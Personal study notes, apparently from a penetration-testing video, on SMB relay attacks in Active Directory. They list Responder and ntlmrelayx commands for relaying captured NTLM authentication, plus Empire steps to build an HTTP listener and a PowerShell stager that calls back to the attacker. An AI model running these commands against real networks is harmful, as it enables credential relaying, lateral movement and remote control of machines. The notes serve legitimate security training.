# SMB Relaying
Tags: #activedirectory #privesc 
Related to:
See also:
Previous:

## Links
Topic: SMB Relay and Empire
Author: TCM
Link: https://www.youtube.com/watch?v=b31KbDb-5DA

## Notes
### SMB Relaying
 A way to take a hash of a user and use it to authenticate on other machines (lateral movement)
 
 Requires SMB signing be disabled/not required
 - Technique relies on spoofing
 - SMB signing is disabled by default
 
 
 ### Procedure
 Run responder (or inveigh) and ntmlrelayx (impacket)
 - Edit Responder.conf
 - Turn off HTTP and SMB
 `python Responder.py -I <interface> -wrf -v`
 --> "Listens for events" in verbose mode
 - Responder sort of acts like a mitm and gives malicious responses to a server that is seeking for help on the network
 
 `python ntlmrelayx.py -tf <target-file> -smb2support`
 - Launches a server that listens for connections. Seems to work automatically along with Responder without explicitly linking the tools together
- `-c`  can be used to run Powershell aftward, e.g. Empire payload
 
 ### Alt Procedure
 Using Empire (post exploitation framework)
 
`listeners`
`use listenerhttp`
`set Port XX`
`set Host XX`
`info` to check your work
`execute`
`back`
`usestager multi/launcher`
`set Listener http`
`generate`  --> makes powershell
Run ntlmrelayx using the powershell exploit
An agent should launch.
`interact`
`info`